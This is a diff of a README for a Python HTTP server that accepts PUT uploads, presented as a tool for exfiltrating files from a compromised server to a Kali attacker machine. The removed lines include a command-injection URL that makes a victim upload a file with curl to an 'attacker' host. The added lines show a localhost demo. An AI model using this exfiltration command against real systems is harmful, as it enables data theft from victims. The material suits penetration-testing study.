@@ -1,10 +1,47 @@
-# SimpleHTTPServer_PUT
-Pythons Module for Simple HTTP Server with *PUT*. 
-</br>This is useful for exfiltration of data once you have access (rev shell) to a machine
-
-</br> Useful for exfiltrating files from a compromised server.
-</br> Once you have a reverse shell you can send files to the attacker computer. You can do this with curl and upload file to the HTTP server on kali;
-Default SimpleHTTPServer in Python does not allow PUT request. Using this server that accepts PUT requests you can upload files with curl;
+## SimpleHTTPServer with PUT method
+SimpleHTTPServer from Python that accespts *PUT* HTTP method. 
+</br>
+Python Module for SimpleHTTPServer does not allow PUT method. Using this server, you can exfiltrate data to the server running on the attacker machine
 
 </br> **Example**
-root@kali:# curl https://victim.php?cmd=curl+http://attacker+--upload-files+flat.txt
+Uploading a simple file *test.file* to the HTTP server. Content of the file:
+```
+┌──(kali㉿kali)-[~]
+└─$ cat test.file
+Upload Successful
+```
+1 Starting the server 
+```
+┌──(kali㉿kali)-[~/tools/SimpleHTTPServer_PUT]
+└─$ python2 HTTPServer_PUT.py
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+2 Sending the file 
+```                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ curl http://localhost:8000 --upload-file test.file
+curl: (52) Empty reply from server
+```
+3 Receiving the file
+```
+┌──(kali㉿kali)-[~/tools/SimpleHTTPServer_PUT]
+└─$ python2 HTTPServer_PUT.py
+Serving HTTP on 0.0.0.0 port 8000 ...
+Host: localhost:8000
+User-Agent: curl/7.79.1
+Accept: */*
+Content-Length: 18
+Expect: 100-continue
+
+^C
+KeyboardInterrupt
+                                                                                                                    
+┌──(kali㉿kali)-[~/tools/SimpleHTTPServer_PUT]
+└─$ ls                                                                                                          1 ⨯
+HTTPServer_PUT.py  README.md  test.file
+                                                                                                                    
+┌──(kali㉿kali)-[~/tools/SimpleHTTPServer_PUT]
+└─$ cat test.file 
+Upload Successful
+
+```
